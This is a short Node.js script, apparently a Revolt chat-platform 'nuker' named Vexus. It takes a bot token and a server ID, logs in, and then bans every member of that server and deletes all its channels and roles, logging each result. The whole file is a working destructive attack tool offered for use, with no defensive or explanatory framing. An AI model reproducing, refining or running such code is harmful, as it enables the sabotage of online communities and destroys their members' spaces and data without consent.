"use strict";

// Dependencies
const revolt = require("revolt.js")

// Variables
const client = new revolt.Client()

const args = process.argv.slice(2)

// Main
if(!args.length) return console.log("usage: node index.js <token> <serverID>")
if(!args[1]) return console.log("Invalid serverID.")

client.on("ready", async()=>{
    console.log("Vexus is running.")

    const server = client.servers.$get(args[1])
    const members = await server.fetchMembers()
    const channels = server.channels
    const roles = Object.keys(server.roles)

    members.users.forEach((user)=>{
        server.banUser(user._id).then(()=>{
            console.log(`Member banned: ${user.username}`)
        }).catch(()=>{
            console.log(`Failed to ban member: ${user.username}`)
        })
    })

    channels.forEach((channel)=>{
        channel.delete().then(()=>{
            console.log(`Channel deleted: ${channel.name}`)
        }).catch(()=>{
            console.log(`Failed to delete channel: ${channel.name}`)
        })
    })

    if(roles.length) roles.forEach((role)=>{
        server.deleteRole(role).then(()=>{
            console.log(`Role deleted: ${role}`)
        }).catch(()=>{
            console.log(`Failed to delete role: ${role}`)
        })
    })
})

client.loginBot(args[0])